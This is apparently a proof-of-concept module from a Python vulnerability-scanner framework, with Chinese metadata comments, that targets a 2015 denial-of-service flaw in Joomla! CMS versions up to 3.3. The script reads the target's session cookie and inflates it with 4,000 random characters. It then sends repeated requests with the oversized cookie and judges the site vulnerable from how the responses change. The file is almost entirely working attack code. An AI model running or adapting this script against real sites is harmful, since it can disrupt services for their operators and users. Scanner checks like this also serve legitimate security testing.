# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import random


class Vuln(ABVuln):
    vuln_id = 'Joomla_0013'  # 平台漏洞编号，留空
    name = 'Joomla! CMS DOS漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-02-27'  # 漏洞公布时间
    desc = '''
        Joomla! Unsafe Design Contributes To DOS.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = '<=3.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '27cee781-8fbc-447f-a371-7709a9e80d20'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            _Host = self.target
            try:
                _Req = requests.session().get(_Host)

                _WebContent = str(_Req.headers)
                _WebTmp = _WebContent.split('; path=/')
                _WebTmp = _WebTmp[0]
                _WebTmp = _WebTmp.split('\'')
                _WebTmp = _WebTmp[len(_WebTmp) - 1]
                _WebTmp = _WebTmp.split('=')
                _SessionID = _WebTmp[0]
                _Session = _WebTmp[1]
            except:
                #args['success'] = False
                return None

            for i in range(4000):
                _Session += random.choice(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
                                           'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm'])

            _Cookies = {
                _SessionID: _Session
            }

            HEADER = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0'
            }

            _Count = 0
            for i in range(10):
                _req = requests.get(_Host, cookies=_Cookies, headers=HEADER)
                _TmpContent = _req.text
                if len(_TmpContent) > _Count:
                    _Count = len(_TmpContent)
                    #args['success'] = False
                else:
                    #args['success'] = True
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    break
            return None

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
